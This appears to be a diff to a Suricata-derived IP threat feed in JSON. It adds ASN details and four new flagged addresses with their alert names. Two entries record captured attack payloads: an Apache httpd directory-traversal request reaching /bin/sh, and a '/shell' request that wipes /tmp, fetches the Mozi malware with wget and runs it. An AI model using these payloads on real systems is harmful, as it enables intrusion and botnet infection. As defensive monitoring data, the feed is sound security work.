@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-10-27T13:00:00Z",
+  "generated_at": "2026-10-28T01:00:00Z",
   "ttl_days": 7,
   "scope": "suricata",
   "counts": {
-    "total": 1365,
-    "v4": 1365,
+    "total": 1369,
+    "v4": 1369,
     "v6": 0
   },
   "items": [
@@ -22268,7 +22268,10 @@
       ],
       "sources": [
         "suricata"
-      ]
+      ],
+      "asn": "7488",
+      "asn_name": "CNSERVER-AP-AS - CNServer LLC",
+      "asn_prefix": "50.114.236.0/24"
     },
     {
       "ip": "20.102.109.125",
@@ -22281,12 +22284,79 @@
       "sources": [
         "suricata"
       ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.64.0.0/10",
       "tags": [
         "mwl:cloud=\"azure\""
       ],
       "payloads": [
         "GET /"
       ]
+    },
+    {
+      "ip": "47.184.58.103",
+      "family": "v4",
+      "first_seen": "2026-10-27T21:00:00Z",
+      "last_seen": "2026-10-27T21:00:00Z",
+      "scenarios": [
+        "suricata/SERVER-WEBAPP Apache HTTP Server httpd directory traversal attempt"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "5650",
+      "asn_name": "FRONTIER-FRTR - Frontier Communications of America, Inc.",
+      "asn_prefix": "47.184.0.0/14",
+      "payloads": [
+        "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
+      ]
+    },
+    {
+      "ip": "85.11.167.38",
+      "family": "v4",
+      "first_seen": "2026-10-27T17:00:00Z",
+      "last_seen": "2026-10-27T17:00:00Z",
+      "scenarios": [
+        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 16"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "197170",
+      "asn_name": "TECHTIES-AS TechTies Inc.",
+      "asn_prefix": "85.11.167.0/24"
+    },
+    {
+      "ip": "110.38.12.14",
+      "family": "v4",
+      "first_seen": "2026-10-27T16:00:00Z",
+      "last_seen": "2026-10-27T16:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING Suspicious Chmod Usage in URI (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "38264",
+      "asn_prefix": "110.38.12.0/22",
+      "payloads": [
+        "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws"
+      ]
+    },
+    {
+      "ip": "91.214.191.234",
+      "family": "v4",
+      "first_seen": "2026-10-27T22:00:00Z",
+      "last_seen": "2026-10-27T22:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Relay/Router (Not Exit) Node Traffic group 628"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "29222",
+      "asn_prefix": "91.214.188.0/22"
     }
   ]
 }
